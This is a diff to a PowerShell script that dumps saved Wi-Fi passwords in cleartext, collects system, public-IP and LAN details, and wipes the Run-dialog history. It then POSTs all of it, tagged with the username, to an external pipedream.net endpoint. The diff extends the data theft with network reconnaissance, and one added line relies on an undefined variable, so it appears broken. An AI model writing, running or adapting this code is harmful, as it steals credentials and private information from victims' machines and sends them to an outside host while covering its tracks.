@@ -1,6 +1,6 @@
 function Find-LANHosts {
     [Cmdletbinding()]
-
+	Param (
         [Parameter(Mandatory, Position=1)]
         [string[]]$IP,
 
@@ -46,6 +46,12 @@ function Find-LANHosts {
 Remove-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse
 $wifi = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {echo "{$name : $pass}`n"}
 $info = Get-ComputerInfo | Out-String
+$public = Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content)
+$local = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.status -ne "Disconnected"})
+$ip = $local.IPv4Address.IPAddress.split(".")
+$local = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.status -ne "Disconnected"}) | Out-String
+$lan = Find-LANHosts -ip @(($test|%{"$ip$_"}))
+
 $net = arp -a | Out-String
-$data = $wifi + $net + $info 
+$data = $wifi + $local + $public + $lan + $info 
 Invoke-RestMethod https://encssv4vtly2.x.pipedream.net/$(whoami) -Method Post -Body $data
